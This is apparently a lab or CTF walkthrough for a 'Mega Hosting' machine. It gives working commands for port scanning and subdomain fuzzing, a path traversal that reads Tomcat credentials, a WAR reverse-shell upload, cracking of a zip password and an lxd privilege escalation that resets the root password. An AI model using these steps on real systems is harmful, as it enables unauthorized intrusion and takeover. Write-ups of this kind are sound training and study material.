# NMAP TCP

Used the [[NMAP Oneliner]]

TARGET: 10.129.33.105
ME: 10.10.14.208

```
nmap -sC -sV -p$(nmap -p- -Pn 10.129.33.105 | grep "/tcp\|/udp" | cut -d"/" -f1 | tr "\n" ", ") 10.129.33.105
```

```
└─$ nmap -sC -sV --top-ports=100 -Pn 10.129.33.105
Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-10 15:08 -0500
Nmap scan report for 10.129.33.105
Host is up (0.051s latency).
Not shown: 97 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 45:3c:34:14:35:56:23:95:d6:83:4e:26:de:c6:5b:d9 (RSA)
|   256 89:79:3a:9c:88:b0:5c:ce:4b:79:b1:02:23:4b:44:a6 (ECDSA)
|_  256 1e:e7:b9:55:dd:25:8f:72:56:e8:8e:65:d5:19:b0:8d (ED25519)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Mega Hosting
8080/tcp open  http    Apache Tomcat
|_http-title: Apache Tomcat
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.82 seconds

```

# Port 80

Found mention of an old vulnerability/data leak

news.php seems to take in a filename query param

dirbuster shows not much

Used ffuf for subdomain enum [[subdomain-discovery]]

```
ffuf -u http://megahosting.htb -c  -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-11000.txt  -H "Host: FUZZ.megahosting.htb" -mc 200 -o subdomains -fs 15949
```

The service on port 80 has an endpoint:

```
http://megahosting.htb/news.php?file=statement
```

Can read the tomcat (on port 8080) users xml file:

```
http://megahosting.htb/news.php?file=../../../../../../../usr/share/tomcat9/etc/tomcat-users.xml
```

Found password:
```
<user username="tomcat" password="$3cureP4s5w0rd123!" roles="admin-gui,manager-script">
</user>
```

# Port 8080

Able to log in to the host manager using the password for tomcat

Able to upload a shell.war file as per [[apache-tomcat-pentesting]] and get a rev shell as tomcat

# Shell as tomcat

TTY Shell spawn:
```
python3 -c 'import pty;pty.spawn("/bin/bash")'; export TERM=xterm-256color
```

Found a backup file owned by user ash that was a password locked zip

Sending it back to my system allowed running zip2john and cracking the hash to get the password

`admin@it`

This password also worked for su to user ash

# Shell as ash

found that we are in lxd group

Used [[lxc-lxd-privilege-escalation]]

Gained access to modify root fs as a mounted filesystem

Was able to then chroot and do root commands like passwd on root user modifying root password

```
chroot /mnt/root
root@testcontainer:/# id
id
uid=0(root) gid=0(root) groups=0(root)
root@testcontainer:/# whoami
whoami
root
root@testcontainer:/# passwd root
passwd root
New password: toor

Retype new password: toor

passwd: password updated successfully
```

Made root password on container host toor

